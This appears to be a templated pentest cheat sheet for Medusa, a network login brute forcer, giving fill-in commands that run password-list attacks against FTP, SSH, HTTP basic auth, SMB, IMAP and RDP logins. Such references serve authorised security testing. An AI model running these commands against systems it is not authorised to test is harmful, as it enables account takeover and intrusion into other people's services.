# Medusa

> Parallel network login brute forcer (alternative to Hydra)

<!-- tags: medusa,brute-force,login,passwords -->

---

## brute ftp
Brute force FTP credentials.

```bash
medusa -h {{TARGET:ip}} -u {{USERNAME:str:admin}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} -M ftp
```

<!-- meta: risk=med | phase=passwords | tags=ftp -->

---

## brute ssh
Brute force SSH credentials.

```bash
medusa -h {{TARGET:ip}} -U {{USERLIST:file:users.txt}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} -M ssh -t {{THREADS:int:4}}
```

<!-- meta: risk=med | phase=passwords | tags=ssh -->

---

## brute http form
Brute force a directory protected by HTTP basic auth.

```bash
medusa -h {{TARGET:ip}} -u {{USERNAME:str:admin}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} -M http -m DIR:{{URI:str:/admin}} -T {{THREADS:int:50}}
```

<!-- meta: risk=med | phase=passwords | tags=http -->

---

## brute smb
Brute force SMB credentials.

```bash
medusa -h {{TARGET:ip}} -U {{USERLIST:file:users.txt}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} -M smbnt
```

<!-- meta: risk=med | phase=passwords | tags=smb -->

---

## brute imap
Brute force IMAP login.

```bash
medusa -h {{TARGET:ip}} -U {{USERLIST:file:users.txt}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} -M imap
```

<!-- meta: risk=med | phase=passwords | tags=imap -->

---

## brute rdp
Brute force RDP credentials.

```bash
medusa -h {{TARGET:ip}} -u {{USERNAME:str:Administrator}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} -M rdp
```

<!-- meta: risk=med | phase=passwords | tags=rdp -->
